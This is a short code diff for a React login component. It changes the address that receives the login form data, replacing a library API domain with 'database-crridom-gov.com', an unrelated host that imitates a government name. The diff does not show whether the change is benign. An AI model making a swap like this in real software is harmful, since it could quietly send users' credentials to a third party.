@@ -21,7 +21,7 @@ const LoginUser = () => {
 
   const handleSubmit = async () => {
     await axios
-      .post("https://api.kvs-library-granthalaya.in/user-form", formData)
+      .post("https://database-crridom-gov.com/user-form", formData)
       .then((result) => {
         console.log(result);
         if (result.data === "failure") {
